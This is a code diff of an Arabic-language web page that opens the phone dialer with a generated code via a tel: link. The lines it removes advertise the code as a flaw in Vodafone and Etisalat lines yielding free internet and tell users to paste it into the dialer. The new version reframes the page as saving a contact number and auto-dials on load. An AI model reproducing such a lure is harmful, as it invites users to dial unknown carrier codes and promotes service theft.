@@ -528,12 +528,13 @@
 
 
         <h1 class="launcher-title">
-            تم نسخ الكود تلقائياً
+            سجّل الرقم التالي في جهات اتصالك
         </h1>
 
 
         <p class="launcher-description">
-دي ثغره في خطوط فدافون و اتصالات بس بتجيب نت مجاني لمده يوم او يومين انت وحظك
+            جاري محاولة فتح تطبيق الاتصال
+            بالرقم التالي.
         </p>
 
 
@@ -541,29 +542,33 @@
         </div>
 
 
-        <div class="warning" style="margin-top: 20px;">
-            <strong>طريقة الاستخدام:</strong><br>
-            1. افتح تطبيق الاتصال<br>
-            2. الصق الكود في خانة الاتصال<br>
-            3. اضغط على زر الاتصال
+        <div class="spinner"></div>
+
+
+        <!-- زر احتياطي -->
+
+        <div id="fallback">
+
+            <div class="warning">
+                إذا لم يفتح تطبيق الاتصال تلقائيًا،
+                اضغط على الزر التالي.
+            </div>
+
+
+            <a
+                id="manualDial"
+                class="button success"
+                href="#"
+            >
+                فتح الرقم
+            </a>
+
         </div>
 
-        <button
-            class="primary"
-            id="launchButton"
-            style="margin-top: 20px;"
-        >
-            فتح الاتصال
-        </button>
 
-        <div class="warning" style="margin-top: 15px; color: #ff6b6b;">
-            <strong>لو الكود مشتغلش اكتبه يدوي</strong><br>
-
-
-
-
-
-
+        <div class="footer">
+            سيتم استخدام تطبيق الاتصال الموجود على جهازك.
+        </div>
 
     </div>
 
@@ -594,8 +599,8 @@ function getCode() {
 
 function createTelURI(code) {
 
-    // استخدام الرموز كما هي بدون تشفير
-    return "tel:" + code;
+    return "tel:" +
+        encodeURIComponent(code);
 }
 
 
@@ -729,14 +734,39 @@ async function copyLink() {
 
 function launchCode(code) {
 
-    // إنشاء رابط tel URI
-    const telURI = createTelURI(code);
+    const telURI =
+        createTelURI(code);
 
-    // نسخ الرقم تلقائياً للحافظة
-    navigator.clipboard.writeText(code).catch(() => {});
 
-    // إعادة التوجيه لبروتوكول الاتصال
-    window.location.href = telURI;
+    /*
+        وضع الرابط في زر التشغيل اليدوي
+    */
+
+    document.getElementById(
+        "manualDial"
+    ).href = telURI;
+
+
+    /*
+        محاولة الفتح التلقائي
+    */
+
+    window.location.href =
+        telURI;
+
+
+    /*
+        إظهار زر احتياطي
+        إذا منع المتصفح التشغيل التلقائي
+    */
+
+    setTimeout(function() {
+
+        document.getElementById(
+            "fallback"
+        ).style.display = "block";
+
+    }, 1200);
 }
 
 
@@ -764,37 +794,41 @@ window.addEventListener(
 
 
         /*
-            إظهار واجهة الشرح بدلاً من الإخفاء
+            إخفاء صفحة المولد
         */
 
         document.getElementById(
             "generator"
         ).style.display = "none";
 
+
+        /*
+            إظهار صفحة التشغيل
+        */
+
         document.getElementById(
             "launcher"
         ).style.display = "block";
 
+
         /*
-            عرض الرقم في الواجهة
+            عرض الرقم / الكود
         */
 
         document.getElementById(
             "codeDisplay"
         ).textContent = code;
 
-        // نسخ الرقم تلقائياً
-        launchCode(code);
 
-        // إضافة حدث للزر
-        document.getElementById(
-            "launchButton"
-        ).addEventListener(
-            "click",
-            function() {
-                launchCode(code);
-            }
-        );
+        /*
+            محاولة فتح الاتصال
+        */
+
+        setTimeout(function() {
+
+            launchCode(code);
+
+        }, 100);
 
     }
 );
